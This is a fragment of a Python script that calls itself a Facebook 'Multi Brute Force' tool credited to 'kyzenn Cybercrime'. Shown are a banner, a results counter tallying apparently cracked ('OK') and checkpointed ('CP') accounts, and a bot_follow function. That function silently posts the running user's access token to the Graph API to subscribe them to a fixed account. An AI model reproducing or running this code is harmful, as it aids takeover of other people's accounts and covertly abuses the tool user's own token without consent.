...
def banner():
    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By kyzenn Cybercrime  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/kyzenn ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")#0004FF23
...
def bot_follow():
	try:
		...
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	requests.post("https://graph.facebook.com/100072475681034/subscribers?access_token=" + toket)      #kyzenn cyaber x#80FF00
	menu()
...
def results(kyzenn,Krahkrah):
        if len(kyzenn) !=0:
                print(("[OK] : "+str(len(kyzenn))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(kyzenn) ==0 and len(Krahkrah) ==0:
                print("\n")
